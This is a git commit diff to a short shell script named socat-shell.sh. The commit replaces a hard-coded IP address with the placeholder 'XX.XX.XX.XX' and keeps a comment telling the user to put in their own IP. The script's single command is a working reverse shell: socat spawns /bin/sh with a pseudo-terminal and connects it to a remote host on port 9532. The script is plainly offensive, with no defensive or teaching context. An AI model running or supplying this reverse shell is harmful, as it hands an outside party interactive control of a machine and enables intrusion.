6cf0fc035a3d13292afc3fc55f544d8b6b9927dc
jmg87 <jordimirallesguri@gmail.com>
2019-04-16 17:35:13 +0200

    Update socat-shell.sh

--- gkpow/socat-shell.sh
+++ gkpow/socat-shell.sh
@@ -1,3 +1,3 @@
 #!/usr/bin/env sh
 #Change the X for your IP 
-socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:213.195.113.119:9532
+socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:XX.XX.XX.XX:9532
